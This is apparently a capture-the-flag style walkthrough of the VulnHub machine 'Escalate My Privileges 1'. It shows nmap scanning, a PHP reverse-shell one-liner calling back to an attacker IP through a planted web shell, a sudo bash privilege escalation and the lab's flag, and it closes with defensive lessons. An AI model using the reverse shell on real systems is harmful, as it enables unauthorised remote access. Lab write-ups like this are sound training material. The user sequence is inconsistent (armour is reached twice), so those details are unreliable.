---
layout: default
title: Escalate My Privileges 1 Vulnhub Machine solved manually
description: VulnHub Escalate My Privileges 1 walkthrough — manual enumeration, exploitation, and privilege escalation without using automated tools.
category: vulnhub
---

# Escalate My Privileges: 1

- [Tools](#tools)
- [Gaining Access](#gaining-access)
- [Privilege Escalation](#privilege-escalation)
- [Lessons Learned](#lessons-learned)

Machine: [https://www.vulnhub.com/entry/escalate-my-privileges-1,448/](https://www.vulnhub.com/entry/escalate-my-privileges-1,448/)

## Tools

- [NMap](https://NMap.org) — network scanner for port and service discovery
- netcat — versatile networking tool for reverse shells and banner grabbing
- md5sum — command-line tool for computing MD5 hashes

## Gaining Access

1. After deploying the VM with a bridged adapter, identify the target IP by checking your network gateway. In my case, the target was at `192.168.0.11`.

2. Run a comprehensive Nmap scan:

   ```bash
   nmap -A 192.168.0.11
   ```

   The scan reveals open ports and a web-based shell at `http://192.168.0.11/phpbash.php`. This is a PHP web shell that provides command execution through the browser as the `apache` user.

3. The web shell gives us command execution, but it's limited to the browser. To get a proper interactive shell, use a PHP reverse shell payload. Start a netcat listener on your machine:

   ```bash
   nc -lvnp 1337
   ```

4. Execute the reverse shell command through phpbash.php:

   ```bash
   php -r '$sock=fsockopen("192.168.0.4",1337);exec("/bin/sh -i <&3 >&3 2>&3");'
   ```

   This opens a reverse connection back to our netcat listener, giving us an interactive shell as user `armour`.

## Privilege Escalation

1. Enumerate the home directory. Inside `/home/armour`, there is a file called `Credentials.txt`. It contains what appears to be an MD5 hash: the hash of `rootroot1`.

2. Upgrade the shell to a proper TTY for better interaction:

   ```bash
   python -c 'import pty; pty.spawn("/bin/bash")'
   ```

3. Compute the MD5 hash and use it to switch to the `armour` user:

   ```bash
   echo -n "rootroot1" | md5sum
   su armour
   # Enter the MD5 hash as the password
   ```

4. Check sudo permissions:

   ```bash
   sudo -l
   ```

   The output shows that `armour` can run `/bin/bash` as root without a password.

5. Escalate to root:

   ```bash
   sudo /bin/bash
   ```

6. Read the flag:

   ```bash
   cat /root/flag.txt
   # 628435356e49f976bab2c04948d22fe4
   ```

## Lessons Learned

- **Web shells are entry points** — phpbash.php is a convenience tool for attackers. Always scan for web shells and remove them from production environments.
- **Credentials in files** — Storing passwords or hashes in text files is a common vulnerability. The `Credentials.txt` file in the home directory was the key to lateral movement.
- **Sudo misconfigurations** — Allowing a user to run `/bin/bash` as root without a password is equivalent to giving them full root access. Audit `sudo -l` regularly and follow the principle of least privilege.

